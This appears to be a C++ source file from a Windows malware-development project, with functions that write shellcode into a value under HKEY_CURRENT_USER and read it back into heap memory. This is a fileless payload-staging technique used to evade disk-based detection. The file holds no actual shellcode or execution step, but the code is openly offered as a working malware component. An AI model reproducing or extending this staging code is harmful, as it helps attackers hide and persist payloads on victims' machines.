#define REGISTRY "SOFTWARE\\YourRegistryKey"  // Define your actual registry key path here
#define REGSTRING "YourPayloadValue"          // Define your actual registry value name here
#include "registry_utils.h"
#include <windows.h>
#include <iostream>
//#include "write_payload.h"



bool WriteShellcodeToRegistry(const std::string& key, const std::string& valueName, const BYTE* data, DWORD dataSize) {
    HKEY hKey;
    // Try to create or open the registry key with write access
    LONG createRes = RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);

    if (createRes != ERROR_SUCCESS) {
        std::cerr << "Failed to create or open registry key. Error code: " << createRes
            << " (Last Error: " << GetLastError() << ")\n";
        return false;
    }

    // Try to set the registry value
    LONG setRes = RegSetValueExA(hKey, valueName.c_str(), 0, REG_BINARY, data, dataSize);
    if (setRes != ERROR_SUCCESS) {
        std::cerr << "Failed to write to registry. Error code: " << setRes
            << " (Last Error: " << GetLastError() << ")\n";
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

//bool ReadShellcodeFromRegistry(const std::string& key, const std::string& valueName, BYTE* buffer, DWORD bufferSize) {
//    HKEY hKey;
//    DWORD type = REG_BINARY;
//
//    if (RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
//        std::cerr << "Failed to open registry key for reading.\n";
//        return false;
//    }
//
//    if (RegGetValueA(hKey, NULL, valueName.c_str(), RRF_RT_REG_BINARY, &type, buffer, &bufferSize) != ERROR_SUCCESS) {
//        std::cerr << "Failed to read from registry.\n";
//        RegCloseKey(hKey);
//        return false;
//    }
//
//    RegCloseKey(hKey);
//    return true;
//}
BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {
    LSTATUS STATUS;
    DWORD dwBytesRequired = 0;
    PVOID pBytes = NULL;

    // Determine the required size of the registry value
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRequired);
    if (STATUS != ERROR_SUCCESS && STATUS != ERROR_MORE_DATA) {
        printf("[ERROR] RegGetValueA Failed With Error: %d\n", STATUS);
        return FALSE;
    }

    // Allocate memory for the shellcode
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRequired);
    if (pBytes == NULL) {
        printf("[ERROR] HeapAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }

    // Read the payload (shellcode) from the registry
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRequired);
    if (STATUS != ERROR_SUCCESS) {
        printf("[ERROR] RegGetValueA Failed With Error: %d\n", STATUS);
        HeapFree(GetProcessHeap(), 0, pBytes);
        return FALSE;
    }

    // Assign the payload and return success
    *ppPayload = (PBYTE)pBytes;
    printf("[DEBUG] Successfully read %d bytes from the registry.\n", dwBytesRequired);
    return TRUE;
}